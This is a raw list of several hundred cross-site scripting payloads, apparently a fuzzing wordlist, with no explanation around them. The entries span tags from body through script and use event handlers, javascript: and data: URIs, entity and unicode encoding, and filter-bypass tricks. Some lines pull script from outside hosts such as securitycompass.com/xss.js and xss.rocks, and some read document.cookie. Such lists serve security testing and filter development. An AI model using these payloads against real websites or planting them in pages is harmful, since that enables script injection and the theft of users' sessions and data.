<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>
<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
<body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>
<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>
<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>
<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>
<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>
<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>
<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>
<body oninput=javascript:alert(1)><input autofocus>
<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>
<body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>
<body onload body onload="javascript:javascript:alert(1)"></body onload>
<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>
<body onload="document.vulnerable=true;">
<body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>
<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
<body onunload body onunload="javascript:javascript:alert(1)"></body onunload>
<body onunload="javascript:alert('XSS');">
<body src=1 href=1 onerror="javascript:alert(1)"></body>
<body/onload=&lt;!--&gt;&#10alert(1)>
<br SIZE="&{document.vulnerable=true}">
<br size=\"&{alert('XSS')}\">
<comment><img src="</comment><img src=x onerror=javascript:alert(1))//">
<div STYLE="background-image: url(&#1;javascript:document.vulnerable=true;)">
<div STYLE="background-image: url(javascript:document.vulnerable=true;)">
<div STYLE="width: expression(document.vulnerable=true);">
<div datafld="b" dataformatas="html" datasrc="#X"></div>
<div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
<div id="x">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>
<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img src=x:x onerror =javascript:alert(1)&gt;">
<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;">
<div id=d><div style="font-family:'sans\27\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>
<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
<div onmouseover="document.vulnerable=true;">
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<div style="background-image: url(javascript:document.vulnerable=true;);">
<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
<div style="background:url(/f#oo/;color:red/*/foo.jpg);">X
<div style="behaviour: url([link to code]);">
<div style="binding: url([link to code]);">
<div style="binding: url(http://www.securitycompass.com/xss.js);"> [Mozilla]
<div style="font-family:'foo ;color:red;';">XXX
<div style="font-family:'foo&#10;;color:red;';">LOL
<div style="font-family:'foo&#10;;color:red;';">XXX
<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
<div style="font-family:foo}color=red;">XXX
<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));">X
<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
<div style="width: expression(document.vulnerable=true;);">
<div style="x:expression((window.r==1)?'':eval('r=1;
<div style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
<div style=content:url(%(svg)s)></div>
<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x
<div/onmouseover='alert(1)'> style="x:">
<div/style="width:expression(confirm(1))">X</div> {IE7}
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
<embed code=%(scriptlet)s></embed>
<embed code=javascript:javascript:alert(1);></embed>
<embed src="data:text/html;base64,%(base64)s">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<embed src="javascript:alert(1)">
<embed src=%(jscript)s></embed>
<embed type="image" src=%(scriptlet)s></embed>
<embed width=500 height=500 code="data:text/html,<script>%(payload)s</script>"></embed>
<event-source src="%(event)s" onload="javascript:alert(1)">
<font style='color:expression(alert(document.cookie))'>
<form id="test" /><button form="test" formaction="javascript:alert(123)">TESTHTML5FORMACTION
<form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X
<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X</script><img/*/src="worksinchrome&colon;prompt&#x28;1&#x29;"/*/onerror='eval(src)'>
<form><button formaction="javascript:alert(123)">crosssitespt
<form><button formaction="javascript:alert(XSS)">lol
<form><button formaction="javascript:javascript:alert(1)">X
<form><button formaction=javascript&colon;alert(1)>CLICKME
<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
<form><iframe src="javascript:alert(1)" ;>
<form><isindex formaction="javascript&colon;confirm(1)"
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
<form><textarea onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
<frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>
<frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>
<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
<frameset onload=alert(123)>
<frameset onload=javascript:alert(1)>
<frameset onload=javascript:javascript:alert(1)></frameset>
<h1><font color=blue>hellox worldss</h1>
<head><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-
<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">XXX</a></body>
<html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>
<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>
<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
<html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>
<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>
<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>
<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>
<html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>
<html><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>"></BODY></html>
<html><noalert><noscript>(123)</noscript><script>(123)</script>
<iframe  src="&Tab;javascript:prompt(1)&Tab;">
<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
<iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>
<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
<iframe src="&Tab;javascript:prompt(1)&Tab;">
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<iframe src="javascript:alert('XSS by \nxss');"></iframe><marquee><h1>XSS by xss</h1></marquee>
<iframe src="javascript:document.vulnerable=true; <
<iframe src="vbscript:document.vulnerable=true;">
<iframe src="x-javascript&colon;alert(document.domain);"></iframe>
<iframe src=%(scriptlet)s <
<iframe src=http://ha.ckers.org/scriptlet.html <
<iframe src=http://xss.rocks/scriptlet.html <
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>">
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<iframe xmlns="#" src="javascript:alert(1)"></iframe>
<iframe/%00/ src=javaSCRIPT&colon;alert(1)
<iframe// src=javaSCRIPT&colon;alert(1)
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
<iframe/onreadystatechange=alert(1)
<iframe/src \/\/onload = prompt(1)
<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
<iframe/src="data:text/html,<svg onload=alert(1)>">
<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>
<image src="javascript:alert(1)">
<image src=1 href=1 onerror="javascript:alert(1)"></image>
<img """><script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
<img DYNSRC="javascript:document.vulnerable=true;">
<img LOWSRC="javascript:document.vulnerable=true;">
<img SRC=" &#14; javascript:document.vulnerable=true;">
<img SRC="jav ascript:document.vulnerable=true;">
<img SRC="javascript:document.vulnerable=true;"
<img SRC="javascript:document.vulnerable=true;">
<img SRC='vbscript:document.vulnerable=true;'>
<img STYLE="xss:expr/*XSS*/ession(document.vulnerable=true)">
<img \x00src=x onerror="alert(1)">
<img \x00src=x onerror="javascript:alert(1)">
<img \x11src=x onerror="javascript:alert(1)">
<img \x12src=x onerror="javascript:alert(1)">
<img \x34src=x onerror="javascript:alert(1)">
<img \x39src=x onerror="javascript:alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img dynsrc="javascript:document.vulnerable=true;">
<img src ?itworksonchrome?\/onerror = alert(1)
<img src onerror /" '"= alt=javascript:alert(1)//">
<img src=“http://victim/newUser?name=<script>alert(1)</script>”/>
<img src="/" =_=" title="onerror='prompt(1)'">
<img src="Mario Heiderich says that svg SHOULD not be executed trough image tags" onerror="javascript:document.write('\u003c\u0069\u0066\u0072\u0061\u006d\u0065\u0020\u0073\u0072\u0063\u003d\u0022\u0064\u0061\u0074\u0061\u003a\u0069\u006d\u0061\u0067\u0065\u002f\u0073\u0076\u0067\u002b\u0078\u006d\u006c\u003b\u0062\u0061\u0073\u0065\u0036\u0034\u002c\u0050\u0048\u004e\u0032\u005a\u0079\u0042\u0034\u0062\u0057\u0078\u0075\u0063\u007a\u0030\u0069\u0061\u0048\u0052\u0030\u0063\u0044\u006f\u0076\u004c\u0033\u0064\u0033\u0064\u0079\u0035\u0033\u004d\u0079\u0035\u0076\u0063\u006d\u0063\u0076\u004d\u006a\u0041\u0077\u004d\u0043\u0039\u007a\u0064\u006d\u0063\u0069\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u0070\u0062\u0057\u0046\u006e\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0045\u0070\u0049\u006a\u0034\u0038\u004c\u0032\u006c\u0074\u0059\u0057\u0064\u006c\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u007a\u0064\u006d\u0063\u0067\u0062\u0032\u0035\u0073\u0062\u0032\u0046\u006b\u0050\u0053\u004a\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u0079\u004b\u0053\u0049\u002b\u0050\u0043\u0039\u007a\u0064\u006d\u0063\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0048\u004e\u006a\u0063\u006d\u006c\u0077\u0064\u0044\u0035\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u007a\u004b\u0054\u0077\u0076\u0063\u0032\u004e\u0079\u0061\u0058\u0042\u0030\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u006b\u005a\u0057\u005a\u007a\u0049\u0047\u0039\u0075\u0062\u0047\u0039\u0068\u005a\u0044\u0030\u0069\u0059\u0057\u0078\u006c\u0063\u006e\u0051\u006f\u004e\u0043\u006b\u0069\u0050\u006a\u0077\u0076\u005a\u0047\u0056\u006d\u0063\u007a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0038\u005a\u0079\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0055\u0070\u0049\u006a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0067\u0050\u0047\u004e\u0070\u0063\u006d\u004e\u0073\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0059\u0070\u0049\u0069\u0041\u0076\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0038\u0064\u0047\u0056\u0034\u0064\u0043\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0063\u0070\u0049\u006a\u0034\u0038\u004c\u0033\u0052\u006c\u0065\u0048\u0051\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0043\u0039\u006e\u0050\u0069\u0041\u0067\u0043\u006a\u0077\u0076\u0063\u0033\u005a\u006e\u0050\u0069\u0041\u0067\u0022\u003e\u003c\u002f\u0069\u0066\u0072\u0061\u006d\u0065\u003e');"></img>
<img src="blah"onmouseover="document.vulnerable=true;">
<img src="blah>" onmouseover="document.vulnerable=true;">
<img src="javascript:alert('XSS')">
<img src="javascript:alert('XSS');">
<img src="javascript:alert(1)">
<img src="javascript:document.vulnerable=true;">
<img src="livescript:document.vulnerable=true;">
<img src="mocha:document.vulnerable=true;">
<img src="x" alt="''onmouseover=alert(1)">
<img src="x:ö" title="onerror=alert(1)//">
<img src="x:? title=" onerror=alert(1)//">
<img src="x:alert" onerror="eval(src%2b'(0)')">
<img src="x:gif" onerror="alert(0)">
<img src="x:gif" onerror="eval('al'%2b'lert(0)')">
<img src="x:gif" onerror="window['al\u0065rt'](0)"></img>
<img src="x` `<script>javascript:alert(1)</script>"` `>
<img src=# onerror\x3D"javascript:alert(1)" >
<img src=&{document.vulnerable=true;};>
<img src='test' onmouseover='alert(2)'>
<img src=1 href=1 onerror="javascript:alert(1)"></img>
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
<img src=``&NewLine; onerror=alert(1)&NewLine;
<img src=`xx:xx`onerror=alert(1)>
<img src=asdf onerror=alert(document.cookie)>
<img src=foo.png onerror=alert(/xssed/) />
<img src=javascript:alert(&quot;XSS&quot;)>
<img src=x onerror=\x00"javascript:alert(1)">
<img src=x onerror=\x09"javascript:alert(1)">
<img src=x onerror=\x10"javascript:alert(1)">
<img src=x onerror=\x11"javascript:alert(1)">
<img src=x onerror=\x12"javascript:alert(1)">
<img src=x onerror=\x32"javascript:alert(1)">
<img src=x:alert(alt) onerror=eval(src) alt=0>
<img src=x\x09onerror="javascript:alert(1)">
<img src=x\x10onerror="javascript:alert(1)">
<img src=x\x11onerror="javascript:alert(1)">
<img src=x\x12onerror="javascript:alert(1)">
<img src=x\x13onerror="javascript:alert(1)">
<img src=xss onerror=alert(1)>
<img src\x00=x onerror="javascript:alert(1)">
<img src\x09=x onerror="javascript:alert(1)">
<img src\x10=x onerror="javascript:alert(1)">
<img src\x11=x onerror="javascript:alert(1)">
<img src\x12=x onerror="javascript:alert(1)">
<img src\x13=x onerror="javascript:alert(1)">
<img src\x32=x onerror="javascript:alert(1)">
<img src\x47=x onerror="javascript:alert(1)">
<img/ src=`~` onerror=prompt(1)>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
<img/src=@ onerror = prompt('1')
<img/src=@&#32;&#13; onerror = prompt('&#49;')
<img/src=`%00` onerror=this.onerror=confirm(1)
<img/src=`` onerror=this.onerror=confirm(1)
<img/src=`` onerror=this.onerror=confirm(1) 
<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
<img\x10src=x onerror="javascript:alert(1)">
<img\x11src=x onerror="javascript:alert(1)">
<img\x13src=x onerror="javascript:alert(1)">
<img\x32src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<input TYPE="IMAGE" SRC="javascript:document.vulnerable=true;">
<input onblur=javascript:alert(1) autofocus><input autofocus>
<input onblur=write(XSS) autofocus><input autofocus>
<input onfocus=javascript:alert(1) autofocus>
<input onfocus=write(XSS) autofocus>
<input type="image" dynsrc="javascript:document.vulnerable=true;">
<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
<input value=<><iframe/src=javascript:confirm(1)
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<isindex action=javascript:alert(1) type=image>
<isindex type=image src=1 onerror=alert(1)>
<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>
<link REL="stylesheet" HREF="javascript:document.vulnerable=true;">
<link rel="stylesheet" href="javascript:document.vulnerable=true;">
<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d
<marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>
<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
<marquee onstart='javascript:alert('1');'>=(◕_◕)=
<marquee><h1>XSS by xss</h1></marquee>
<marquee><script>alert('XSS')</script></marquee>
<math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
<math><a xlink:href="//jsfiddle.net/t846h/">click
<meta HTTP-EQUIV="Link" Content="<http://www.securitycompass.com/xss.css>; REL=stylesheet">
<meta HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.vulnerable=true</SCRIPT>">
<meta HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:document.vulnerable=true;">
<meta HTTP-EQUIV="refresh" CONTENT="0;url=javascript:document.vulnerable=true;">
<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>
<meta charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾
<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<meta http-equiv="refresh" content="0;url=javascript:document.vulnerable=true;">
<object classid="clsid:..." codebase="javascript:document.vulnerable=true;">
<object data="data:text/html;base64,%(base64)s">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<object data="javascript:alert(0)">
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
<object onError object onError="javascript:javascript:alert(1)"></object onError>
<object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>
<object onerror=javascript:javascript:alert(1)>
<object src=1 href=1 onerror="javascript:alert(1)"></object>
<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
<sVg><scRipt >alert&lpar;1&rpar; {Opera}
<scr<script>ipt>alert('XSS');</scr</script>ipt>
<scr<script>ipt>alert(/Xss/)</scr</script>ipt>
<scr<script>ipt>alert(1)</scr</script>ipt>
<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
<script "a='>'" SRC="http://www.securitycompass.com/xss.js"></script>
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
<script /**/>/**/alert(1)/**/</script /**/
<script <B>document.vulnerable=true;</script>
<script =">" SRC="http://www.securitycompass.com/xss.js"></script>
<script SRC="http://www.securitycompass.com/xss.jpg"></script>
<script ^__^>alert(String.fromCharCode(49))</script ^__^
<script a=">" '' SRC="http://www.securitycompass.com/xss.js"></script>
<script a=">" SRC="http://www.securitycompass.com/xss.js"></script>
<script a=">'>" SRC="http://www.securitycompass.com/xss.js"></script>
<script a=`>` SRC="http://www.securitycompass.com/xss.js"></script>
<script charset="\x22>javascript:alert(1)</script>
<script itworksinallbrowsers>/*<script* */alert(1)</script
<script language="JavaScript">alert('XSS')</script>
<script language='javascript' src='%(jscript)s'></script>
<script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>
<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
<script src="#">{alert(1)}</script>;1
<script src="/\%(jscript)s"></script>
<script src="\\%(jscript)s"></script>
<script src="data:\xCB\x8F,javascript:alert(1)"></script>
<script src="data:\xD4\x8F,javascript:alert(1)"></script>
<script src="data:\xE0\xA4\x98,javascript:alert(1)"></script>
<script src="data:text/javascript,alert(1)"></script>
<script src="data:text/plain\x2Cjavascript:alert(1)"></script>
<script src="javascript:alert(1)">
<script src=%(jscript)s></script>
<script src=1 href=1 onerror="javascript:alert(1)"></script>
<script src=http://yoursite.com/your_files.js></script>
<script x> alert(1) </script 1=2
<script ~~~>alert(0%0)</script ~~~>
<script+&injection=>alert(1)></script>
<script+src=">"+src="http://yoursite.com/xss.js?69,69"></script>
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
<script>%(payload)s</script>
<script>({0:#0=alert/#0#/#0#(0)})</script>
<script>({0:#0=alert/#0#/#0#(123)})</script>
<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>
<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>
<script>+-+-1-+-+alert(1)</script>
<script>-=alert;-(1)</script> "onmouseover="confirm(document.domain);"" </script>
<script>/* *\x00/javascript:alert(1)// */</script>
<script>/* *\x2A/javascript:alert(1)// */</script>
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>
<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x</script>
<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>
<script>String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 104, 105, 34, 41, 59)</script>
<script>a=/XSS/\ndocument.vulnerable=true;</script>
<script>alert(‘XSS’)</script>
<script>alert(“XSS”);</script>
<script>alert(“XSS”)</script> 
<script>alert(“Xss”)</script>
<script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
<script>alert("XSS");</script>&search=1
<script>alert("hellox worldss");</script>
<script>alert("hellox worldss")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510
<script>alert('XSS');</script>
<script>alert('XSS')</script>
<script>alert(/XSS”)</script>
<script>alert(/XSS/)</script>
<script>alert(1);</script>
<script>alert(1)</script>
<script>alert(123);</script>
<script>alert(123)</script>
<script>alert(1337)</script><marquee><h1>XSS by xss</h1></marquee>
<script>alert(2)</script> "><img src=x onerror=prompt(document.domain)>
<script>alert(String.fromCharCode(88,83,83))</script>
<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
<script>document.vulnerable=true;</script>
<script>document.write("<SCRI");</SCRIPT>PT SRC="http://www.securitycompass.com/xss.js"></script>
<script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}</script>
<script>if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}</script>
<script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}</script>
<script>javascript:alert(1)</script>
<script>javascript:alert(1)</script\x0A
<script>javascript:alert(1)</script\x0B
<script>javascript:alert(1)</script\x0D
<script>javascript:alert(1)<\x00/script>
<script>var var = 1; alert(var)</script>
<script>window.alert('XSS Vulnerable');</script>
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script\x00>javascript:alert(1)</script>
<script\x09>javascript:alert(1)</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0A>javascript:alert(1)</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
<script\x0C>javascript:alert(1)</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x0D>javascript:alert(1)</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x20>javascript:alert(1)</script>
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x2F>javascript:alert(1)</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
